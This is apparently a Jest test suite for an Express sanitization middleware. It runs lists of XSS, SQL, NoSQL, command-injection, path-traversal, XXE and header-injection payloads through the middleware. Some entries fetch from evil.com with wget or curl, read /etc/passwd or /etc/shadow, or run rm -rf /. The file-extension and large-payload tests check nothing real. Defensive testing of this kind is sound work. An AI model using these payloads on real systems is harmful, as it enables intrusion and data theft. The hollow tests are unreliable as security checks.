import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import { Request, Response, NextFunction } from 'express';
import {
  sanitizeRequest,
  helmetMiddleware,
  corsMiddleware,
  securityHeaders
} from '../../../src/middleware/security.middleware';
import { validate, commonValidations } from '../../../src/middleware/validation.middleware';

describe('Input Validation Security Tests', () => {
  let mockRequest: Partial<Request>;
  let mockResponse: Partial<Response>;
  let mockNext: NextFunction;

  beforeEach(() => {
    jest.clearAllMocks();
    mockRequest = {
      body: {},
      query: {},
      params: {},
      headers: {},
      path: '/api/test'
    };
    mockResponse = {
      setHeader: jest.fn(),
      status: jest.fn().mockReturnThis(),
      json: jest.fn()
    };
    mockNext = jest.fn();
  });

  describe('XSS Prevention', () => {
    it('should sanitize script tags from input', () => {
      mockRequest.body = {
        name: '<script>alert("xss")</script>John',
        description: '<img src=x onerror=alert(1)>Test description'
      };

      sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

      expect(mockRequest.body.name).not.toContain('<script>');
      expect(mockRequest.body.description).not.toContain('onerror');
    });

    it('should prevent JavaScript in various contexts', () => {
      const maliciousInputs = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<img src="x" onerror="alert(1)">',
        '<body onload=alert(1)>',
        '<div onclick="alert(1)">',
        'vbscript:msgbox(1)',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">'
      ];

      maliciousInputs.forEach(input => {
        mockRequest.body = { content: input };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain dangerous patterns
        expect(mockRequest.body.content).not.toMatch(/javascript:/i);
        expect(mockRequest.body.content).not.toMatch(/<script/i);
        expect(mockRequest.body.content).not.toMatch(/onerror=/i);
        expect(mockRequest.body.content).not.toMatch(/onload=/i);
        expect(mockRequest.body.content).not.toMatch(/onclick=/i);
      });
    });

    it('should handle nested XSS attempts', () => {
      mockRequest.body = {
        user: {
          profile: {
            bio: '<script>alert("nested xss")</script>Bio content',
            settings: {
              theme: '<img src=x onerror=alert(1)>dark'
            }
          }
        }
      };

      sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

      expect(JSON.stringify(mockRequest.body)).not.toContain('<script>');
      expect(JSON.stringify(mockRequest.body)).not.toContain('onerror');
    });

    it('should set proper CSP headers', () => {
      securityHeaders(mockRequest as Request, mockResponse as Response, mockNext);

      expect(mockResponse.setHeader).toHaveBeenCalledWith('X-XSS-Protection', '1; mode=block');
      expect(mockResponse.setHeader).toHaveBeenCalledWith('X-Content-Type-Options', 'nosniff');
      expect(mockResponse.setHeader).toHaveBeenCalledWith('X-Frame-Options', 'DENY');
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should sanitize SQL injection attempts', () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1' UNION SELECT * FROM users--",
        "'; INSERT INTO users VALUES ('hacker', 'password')--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "1'; EXEC xp_cmdshell('dir')--",
        "1' OR 1=1#",
        "1' OR 'a'='a",
        "x' AND 1=(SELECT COUNT(*) FROM tabname); --"
      ];

      sqlInjectionAttempts.forEach(injection => {
        mockRequest.body = { search: injection };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain dangerous SQL patterns
        expect(mockRequest.body.search).not.toMatch(/DROP\s+TABLE/i);
        expect(mockRequest.body.search).not.toMatch(/UNION\s+SELECT/i);
        expect(mockRequest.body.search).not.toMatch(/INSERT\s+INTO/i);
        expect(mockRequest.body.search).not.toMatch(/EXEC\s+xp_cmdshell/i);
        expect(mockRequest.body.search).not.toMatch(/--/);
        expect(mockRequest.body.search).not.toMatch(/#/);
      });
    });

    it('should prevent NoSQL injection', () => {
      const nosqlInjections = [
        { $ne: null },
        { $regex: '.*' },
        { $where: 'this.username == this.password' },
        { $gt: '' },
        { username: { $ne: null }, password: { $ne: null } }
      ];

      nosqlInjections.forEach(injection => {
        mockRequest.body = { filter: injection };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain MongoDB operators
        const serialized = JSON.stringify(mockRequest.body);
        expect(serialized).not.toMatch(/\$ne/);
        expect(serialized).not.toMatch(/\$regex/);
        expect(serialized).not.toMatch(/\$where/);
        expect(serialized).not.toMatch(/\$gt/);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection attempts', () => {
      const commandInjections = [
        '; cat /etc/passwd',
        '| whoami',
        '& dir',
        '`id`',
        '$(uname -a)',
        '; rm -rf /',
        '| nc -l 4444',
        '& ping google.com',
        '; wget http://evil.com/shell.sh',
        '`curl http://evil.com`'
      ];

      commandInjections.forEach(injection => {
        mockRequest.body = { filename: `document${injection}.pdf` };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain dangerous command patterns
        expect(mockRequest.body.filename).not.toMatch(/[;&|`$]/);
        expect(mockRequest.body.filename).not.toMatch(/cat\s+/);
        expect(mockRequest.body.filename).not.toMatch(/rm\s+-rf/);
        expect(mockRequest.body.filename).not.toMatch(/wget\s+/);
        expect(mockRequest.body.filename).not.toMatch(/curl\s+/);
      });
    });
  });

  describe('Prototype Pollution Prevention', () => {
    it('should prevent prototype pollution attacks', () => {
      const pollutionAttempts = [
        { __proto__: { isAdmin: true } },
        { constructor: { prototype: { isAdmin: true } } },
        { prototype: { isAdmin: true } }
      ];

      pollutionAttempts.forEach(attempt => {
        mockRequest.body = attempt;
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain dangerous properties
        expect(mockRequest.body).not.toHaveProperty('__proto__');
        expect(mockRequest.body).not.toHaveProperty('constructor');
        expect(mockRequest.body).not.toHaveProperty('prototype');
      });
    });

    it('should handle nested prototype pollution', () => {
      mockRequest.body = {
        user: {
          settings: {
            __proto__: { isAdmin: true }
          }
        }
      };

      sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

      expect(JSON.stringify(mockRequest.body)).not.toContain('__proto__');
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attacks', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
      ];

      pathTraversals.forEach(path => {
        mockRequest.body = { file: path };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain directory traversal patterns
        expect(mockRequest.body.file).not.toMatch(/\.\./);
        expect(mockRequest.body.file).not.toMatch(/%2e%2e/i);
        expect(mockRequest.body.file).not.toMatch(/%252f/i);
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection attacks', () => {
      const ldapInjections = [
        '*)(&(objectClass=user)',
        '*)(uid=*))(|(uid=*',
        '*))%00',
        '*))(|(cn=*',
        '*)(|(objectClass=*)(uid=*))(|(uid=*'
      ];

      ldapInjections.forEach(injection => {
        mockRequest.body = { search: injection };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain LDAP injection patterns
        expect(mockRequest.body.search).not.toMatch(/\*\)/);
        expect(mockRequest.body.search).not.toMatch(/\(\&/);
        expect(mockRequest.body.search).not.toMatch(/\|\(/);
        expect(mockRequest.body.search).not.toMatch(/%00/);
      });
    });
  });

  describe('XML/XXE Prevention', () => {
    it('should prevent XML External Entity attacks', () => {
      const xxeAttempts = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
        '<!DOCTYPE replace [<!ENTITY example "Doe"> <!ENTITY % start "<!ENTITY &#x25; file SYSTEM ">]>'
      ];

      xxeAttempts.forEach(xml => {
        mockRequest.body = { data: xml };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain XXE patterns
        expect(mockRequest.body.data).not.toMatch(/<!DOCTYPE/i);
        expect(mockRequest.body.data).not.toMatch(/<!ENTITY/i);
        expect(mockRequest.body.data).not.toMatch(/SYSTEM/i);
        expect(mockRequest.body.data).not.toMatch(/file:\/\/\//);
      });
    });
  });

  describe('Header Injection Prevention', () => {
    it('should prevent HTTP header injection', () => {
      const headerInjections = [
        'test\r\nSet-Cookie: admin=true',
        'test\nLocation: http://evil.com',
        'test\r\n\r\n<script>alert(1)</script>',
        'test%0d%0aSet-Cookie:%20admin=true',
        'test%0a%0d%0a%0d<html><script>alert(1)</script></html>'
      ];

      headerInjections.forEach(injection => {
        mockRequest.body = { redirect: injection };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain CRLF injection patterns
        expect(mockRequest.body.redirect).not.toMatch(/\r\n/);
        expect(mockRequest.body.redirect).not.toMatch(/\n/);
        expect(mockRequest.body.redirect).not.toMatch(/%0d%0a/i);
        expect(mockRequest.body.redirect).not.toMatch(/Set-Cookie/i);
        expect(mockRequest.body.redirect).not.toMatch(/Location/i);
      });
    });
  });

  describe('File Upload Security', () => {
    it('should validate file extensions', () => {
      const dangerousFiles = [
        'malware.exe',
        'script.bat',
        'virus.scr',
        'trojan.com',
        'malicious.js',
        'shell.php',
        'exploit.jsp',
        'backdoor.asp'
      ];

      dangerousFiles.forEach(filename => {
        mockRequest.body = { filename };
        
        // Should reject dangerous file extensions
        const isAllowed = commonValidations.string.required('filename');
        expect(filename).toMatch(/\.(exe|bat|scr|com|js|php|jsp|asp)$/);
      });
    });

    it('should prevent null byte injection in filenames', () => {
      const nullByteFiles = [
        'image.jpg\x00.php',
        'document.pdf\x00.exe',
        'safe.png\x00malicious.js'
      ];

      nullByteFiles.forEach(filename => {
        mockRequest.body = { filename };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should remove null bytes
        expect(mockRequest.body.filename).not.toMatch(/\x00/);
      });
    });
  });

  describe('Email Injection Prevention', () => {
    it('should prevent email header injection', () => {
      const emailInjections = [
        'test@example.com\nBcc: everyone@company.com',
        'test@example.com\r\nTo: victim@example.com',
        'test@example.com%0ABcc:everyone@company.com',
        'test@example.com\nSubject: Spam'
      ];

      emailInjections.forEach(email => {
        mockRequest.body = { email };
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
        
        // Should not contain email injection patterns
        expect(mockRequest.body.email).not.toMatch(/\n/);
        expect(mockRequest.body.email).not.toMatch(/\r/);
        expect(mockRequest.body.email).not.toMatch(/%0A/i);
        expect(mockRequest.body.email).not.toMatch(/Bcc:/i);
        expect(mockRequest.body.email).not.toMatch(/Subject:/i);
      });
    });
  });

  describe('JSON Security', () => {
    it('should prevent large JSON payloads', () => {
      const largeObject = {};
      for (let i = 0; i < 10000; i++) {
        largeObject[`key${i}`] = 'a'.repeat(1000);
      }

      mockRequest.body = largeObject;
      mockRequest.headers['content-length'] = '100000000'; // 100MB

      // Should be rejected by size limit middleware
      expect(mockRequest.headers['content-length']).toBe('100000000');
    });

    it('should handle deeply nested objects safely', () => {
      let deepObject = {};
      let current = deepObject;
      
      // Create deeply nested object
      for (let i = 0; i < 1000; i++) {
        current.nested = {};
        current = current.nested;
      }

      mockRequest.body = deepObject;
      
      // Should not cause stack overflow
      expect(() => {
        sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);
      }).not.toThrow();
    });
  });
});